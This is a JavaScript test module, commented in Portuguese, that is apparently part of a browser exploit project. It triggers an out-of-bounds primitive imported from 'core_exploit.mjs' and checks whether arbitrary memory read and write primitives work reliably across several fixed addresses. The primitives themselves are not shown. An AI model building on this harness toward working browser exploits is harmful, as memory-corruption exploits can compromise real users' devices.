// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v20: Teste de Transição de Endereço Detalhado)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    isOOBReady,
    arb_read,  // Do core_exploit.mjs (versão síncrona, reutiliza DV - "v17_base")
    arb_write  // Do core_exploit.mjs (versão síncrona, reutiliza DV - "v17_base")
} from '../core_exploit.mjs';

export const FNAME_MODULE_V28 = "GetterArbitraryRead_v20_AddressTransition";

// === Constantes ===
const ADDR_X = new AdvancedInt64(0x00000D00, 0x00000000);
const VALOR_X1 = new AdvancedInt64(0x11223344, 0x55667788);
const VALOR_X2 = new AdvancedInt64(0x88776655, 0x44332211); // VALOR_X1 sobrescrito

const ADDR_Y = new AdvancedInt64(0x00000E00, 0x00000000); // Novo endereço
const VALOR_Y1 = new AdvancedInt64(0xAAAAAAAA, 0x11111111);

const ADDR_Z = new AdvancedInt64(0x00000F00, 0x00000000); // Outro novo endereço
const VALOR_Z1 = new AdvancedInt64(0xBBBBBBBB, 0x22222222);


const PAUSE_BETWEEN_STEPS_MS = 100;

async function perform_rw_check(step, addr, value_to_write, expected_value_after_write, results_array) {
    const FNAME_STEP = `${FNAME_MODULE_V28}.perform_rw_check`;
    let step_success = false;
    let read_val_str = "N/A";
    let write_desc = value_to_write ? `Escrever ${value_to_write.toString(true)} em ${addr.toString(true)}` : "Nenhuma escrita";
    let read_desc = `Ler de ${addr.toString(true)}, esperando ${expected_value_after_write.toString(true)}`;
    
    logS3(`    ${step}: Iniciando - ${write_desc} & ${read_desc}`, "info", FNAME_STEP);

    try {
        if (value_to_write) {
            arb_write(addr, value_to_write, 8);
            logS3(`        ${step}: Escrita (supostamente) realizada.`, "debug", FNAME_STEP);
            await PAUSE_S3(PAUSE_BETWEEN_STEPS_MS / 2); // Pausa curta após escrita
        }

        const read_obj = arb_read(addr, 8);
        read_val_str = isAdvancedInt64Object(read_obj) ? read_obj.toString(true) : "ERRO_LEITURA";
        
        if (expected_value_after_write.equals(read_obj)) {
            step_success = true;
            logS3(`        ${step}: Lido ${read_val_str} - CORRETO!`, "good", FNAME_STEP);
        } else {
            logS3(`        ${step}: Lido ${read_val_str} (Esperado: ${expected_value_after_write.toString(true)}) - INCORRETO!`, "error", FNAME_STEP);
        }
    } catch (e) {
        logS3(`        ${step}: ERRO na operação: ${e.message}`, "error", FNAME_STEP);
        read_val_str = `ERRO_CATCH: ${e.message}`;
    }
    results_array.push({ step, address: addr.toString(true), written: value_to_write ? value_to_write.toString(true) : "N/A", expected_read: expected_value_after_write.toString(true), actual_read: read_val_str, success: step_success });
    await PAUSE_S3(PAUSE_BETWEEN_STEPS_MS);
    return step_success;
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testAddressTransition`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste de Transição de Endereço Detalhado (v20) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    let errorCapturedMain = null;
    let overall_test_success = true;
    let final_message = "Todos os testes de transição executados.";
    let all_results = [];

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB inicial principal não pôde ser configurado.");
        }
        logS3("PASSO GLOBAL: Ambiente OOB inicial principal configurado.", "info", FNAME_CURRENT_TEST);

        // Teste 1: Escrita/Leitura no mesmo ADDR_X
        if (!await perform_rw_check("T1.1_WriteX1", ADDR_X, VALOR_X1, VALOR_X1, all_results)) overall_test_success = false;
        if (!await perform_rw_check("T1.2_ReadX1", ADDR_X, null, VALOR_X1, all_results)) overall_test_success = false; // Lê o que foi escrito
        if (!await perform_rw_check("T1.3_WriteX2", ADDR_X, VALOR_X2, VALOR_X2, all_results)) overall_test_success = false; // Sobrescreve
        if (!await perform_rw_check("T1.4_ReadX2", ADDR_X, null, VALOR_X2, all_results)) overall_test_success = false; // Lê o novo valor
        logS3("--- Teste 1 (Mesmo Endereço) Concluído ---", "subtest", FNAME_CURRENT_TEST);

        // Teste 2: Escreve em ADDR_Y, depois lê de ADDR_Y
        if (!await perform_rw_check("T2.1_WriteY1", ADDR_Y, VALOR_Y1, VALOR_Y1, all_results)) overall_test_success = false;
        if (!await perform_rw_check("T2.2_ReadY1", ADDR_Y, null, VALOR_Y1, all_results)) overall_test_success = false;
        logS3("--- Teste 2 (Novo Endereço Y) Concluído ---", "subtest", FNAME_CURRENT_TEST);

        // Teste 3: Escreve em ADDR_Z, depois lê de ADDR_Z
        if (!await perform_rw_check("T3.1_WriteZ1", ADDR_Z, VALOR_Z1, VALOR_Z1, all_results)) overall_test_success = false;
        if (!await perform_rw_check("T3.2_ReadZ1", ADDR_Z, null, VALOR_Z1, all_results)) overall_test_success = false;
        logS3("--- Teste 3 (Novo Endereço Z) Concluído ---", "subtest", FNAME_CURRENT_TEST);

        // Teste 4: Verificar se os valores anteriores (X2, Y1) ainda estão corretos
        logS3("--- Iniciando Teste 4: Re-verificação de Endereços Anteriores ---", "subtest", FNAME_CURRENT_TEST);
        if (!await perform_rw_check("T4.1_ReReadX2", ADDR_X, null, VALOR_X2, all_results)) overall_test_success = false;
        if (!await perform_rw_check("T4.2_ReReadY1", ADDR_Y, null, VALOR_Y1, all_results)) overall_test_success = false;
        logS3("--- Teste 4 (Re-verificação) Concluído ---", "subtest", FNAME_CURRENT_TEST);
        
        // Teste 5: Simular o problema do bloco, mas com mais isolamento
        logS3("--- Iniciando Teste 5: Bloco Isolado (ADDR_Y, ADDR_Z) ---", "subtest", FNAME_CURRENT_TEST);
        // Re-escreve Y1 e Z1 para garantir estado inicial para este teste de bloco
        if (!await perform_rw_check("T5.0a_ReWriteY1", ADDR_Y, VALOR_Y1, VALOR_Y1, all_results)) overall_test_success = false;
        if (!await perform_rw_check("T5.0b_ReWriteZ1", ADDR_Z, VALOR_Z1, VALOR_Z1, all_results)) overall_test_success = false;

        logS3("    T5: Lendo ADDR_Y primeiro, depois ADDR_Z", "info", FNAME_CURRENT_TEST);
        if (!await perform_rw_check("T5.1_ReadY1_Again", ADDR_Y, null, VALOR_Y1, all_results)) overall_test_success = false;
        if (!await perform_rw_check("T5.2_ReadZ1_Again", ADDR_Z, null, VALOR_Z1, all_results)) overall_test_success = false;
        
        // Inverte a ordem de escrita para ver se influencia a leitura "presa"
        logS3("    T5: Re-escrevendo em ordem Z depois Y, depois lendo Y e Z", "info", FNAME_CURRENT_TEST);
        if (!await perform_rw_check("T5.3a_ReWriteZ1_Order2", ADDR_Z, VALOR_Z1, VALOR_Z1, all_results)) overall_test_success = false;
        if (!await perform_rw_check("T5.3b_ReWriteY1_Order2", ADDR_Y, VALOR_Y1, VALOR_Y1, all_results)) overall_test_success = false;
        
        if (!await perform_rw_check("T5.4_ReadY1_AfterReverseWrite", ADDR_Y, null, VALOR_Y1, all_results)) overall_test_success = false; // Espera Y1, mas pode pegar Z1 se o problema persistir com a última escrita no DV
        if (!await perform_rw_check("T5.5_ReadZ1_AfterReverseWrite", ADDR_Z, null, VALOR_Z1, all_results)) overall_test_success = false;

        logS3("--- Teste 5 (Bloco Isolado) Concluído ---", "subtest", FNAME_CURRENT_TEST);


        if (overall_test_success) {
            final_message = "SUCESSO GERAL: Todos os testes de transição de endereço passaram.";
        } else {
            final_message = "FALHA PARCIAL: Um ou mais testes de transição de endereço falharam.";
        }
        logS3(`MSG FINAL: ${final_message}`, overall_test_success ? "vuln" : "error", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28}: ${overall_test_success ? "TRANS OK" : "TRANS FALHA"}`;

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        final_message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
        overall_test_success = false;
    } finally {
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Final Teste de Transição (v20): Success=${overall_test_success}, Msg='${final_message}'`, overall_test_success ? "good" : "warn", FNAME_CURRENT_TEST);
        all_results.forEach(res => {
            logS3(`  DETALHE ${res.step}: Addr=${res.address}, Escrito=${res.written}, Lido=${res.actual_read}, Esperado=${res.expected_read}, Sucesso=${res.success}${res.error ? `, Erro='${res.error}'` : ''}`, res.success ? "debug" : "error", FNAME_CURRENT_TEST);
        });
    }

    return {
        errorOccurred: errorCapturedMain,
        overall_success: overall_test_success,
        final_message: final_message,
        results_details: all_results
    };
}
